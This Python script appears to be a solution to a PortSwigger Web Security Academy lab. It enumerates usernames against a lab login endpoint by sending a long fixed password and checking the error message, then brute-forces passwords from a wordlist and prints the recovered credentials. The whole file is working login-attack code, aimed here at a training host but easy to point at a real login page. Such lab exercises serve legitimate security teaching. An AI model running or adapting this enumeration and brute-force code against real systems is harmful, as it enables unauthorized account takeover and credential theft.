from http import HTTPStatus
from pathlib import Path
from rich.theme import Theme

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import Progress
from rich.progress import track

app = typer.Typer()
custom_theme = Theme({
    "info": "green",
    "warning": "yellow",
    "danger": "bold red"
})
console = Console(theme=custom_theme)




@app.command()
def run():
    invalid_username = 'Invalid username or password.'
    lab_id= '0ad700fd03705e4381fe48d5005b0048'
    
    username_found = 'user'
    password='709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002'
    user_found= False

    with open("usernames.txt", "r") as file:
        file_lines = file.readlines()
        file_length = len(file_lines)
        with Progress() as progress:
            task = progress.add_task("Usernames fuzzing...", total=file_length) 
            for username in file_lines:
                #print(username)
        
                if not username:
                    break
                response = requests.post(
                                        f"https://{lab_id}.web-security-academy.net/login", data= {
                                            "username" : username.strip(),
                                            "password": password
                                        }, headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login"
                                        })
        
                response_text = response.text
               # print(response.text)
                if invalid_username not in response_text:
                    console.print(f'\npossible username found: {username}', style="warning")
                    username_found = username
                    progress.update(task, advance=file_length)
                    user_found=True
                    break
                    

                
                progress.update(task, advance=1)
    invalid_username='Invalid username or password'
    with open("passwords.txt", "r") as file:
        file_lines = file.readlines()
        file_length = len(file_lines)
        with Progress() as progress:
            task = progress.add_task(f"Password fuzzing for {username_found} ...", total=file_length) 
            for password in file_lines:
                #print(username)
        
                if not password:
                    break
                response = requests.post(
                                        f"https://{lab_id}.web-security-academy.net/login", data= {
                                            "username" : username_found.strip(),
                                            "password": password.strip()
                                        }, headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login"
                                        })
        
                response_text = response.text
            # print(response.text)
                if invalid_username not in response_text:
                    console.print(f'\n leaked credentials {username_found.strip()}:{password.strip()}', style="info")
                    progress.update(task, advance=file_length)
                    user_found=True
                    break

                
                progress.update(task, advance=1)
        

                

    
    
    



    

  

    

if __name__ == "__main__":
    app()
